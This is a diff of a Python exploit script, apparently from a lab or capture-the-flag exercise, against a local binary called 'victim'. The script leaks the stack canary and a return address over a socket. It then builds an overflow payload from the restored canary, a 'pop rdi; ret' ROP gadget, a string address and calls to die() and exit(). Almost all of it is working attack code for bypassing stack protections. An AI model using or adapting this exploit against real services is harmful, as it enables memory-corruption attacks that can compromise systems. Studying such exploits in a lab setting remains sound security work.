@@ -12,12 +12,10 @@ s.connect(sock)
 strg = b'A' * 24 + b'\n48\n'
 s.send(strg)
 data = s.recv(1024)
-#s.close()
 
 b_canary = []
 canary = []
 ret_addr = []
-
 valuebyte = ''
 
 for i in range(len(data)):
@@ -38,16 +36,10 @@ for i in range(len(data)):
 os.system('readelf -a victim | grep -i "entry" > tmp')
 binadd = open('tmp', 'r').read()
 binadd = binadd.split(':')
-#print(binadd[1].strip())
 
-#print(canary)
 canary.reverse()
-#print(canary)
 canary_str = ''
 for c in range(8):
-	#print(canary[c])
-	#print(str(canary[c]))
-	#print(canary[c].decode('hex'))
 	canary_str += canary[c]
 
 ret_addr.reverse()
@@ -68,15 +60,13 @@ strg+= b'BBBBBBBB'  # BBBBBBBB
 for c in range(8):
         strg += struct.pack('B',b_canary[c])
 strg+= b'\xde\xad\xbe\xef\x00\x00\x00\x00' # deadbeef
-strg+= b'\xf0\xe4\xff\xff\xff\x7f\x00\x00' # ret2libc
-#strg+= b'\xea\x4a\x55\x55\x55\x55\x00\x00' # die()
-strg+= b'\x40\x70\xa4\xf7\xff\x7f\x00\x00' # exit()
-strg+= b'\x40\x70\xa4\xf7\xff\x7f\x00\x00' # exit()
-strg+= b'\x33\x0f\x00\x00\x00\x00\x00\x00' # pop rdi; ret
+#strg+= b'\x40\x70\xa4\xf7\xff\x7f\x00\x00' # exit()
+strg+= b'\x33\x4f\x55\x55\x55\x55\x00\x00' # 0x555555554000 + 0xf33 -- pop rdi; ret
 strg+= b'\xc0\xe4\xff\xff\xff\x7f\x00\x00' # string address
+strg+= b'\xea\x4a\x55\x55\x55\x55\x00\x00' # die()
+strg+= b'\x40\x70\xa4\xf7\xff\x7f\x00\x00' # exit()
 
 #send string and length to server
-#s.connect(sock)
 strg += b'\n88\n'
 #print(strg)
 s.send(strg)
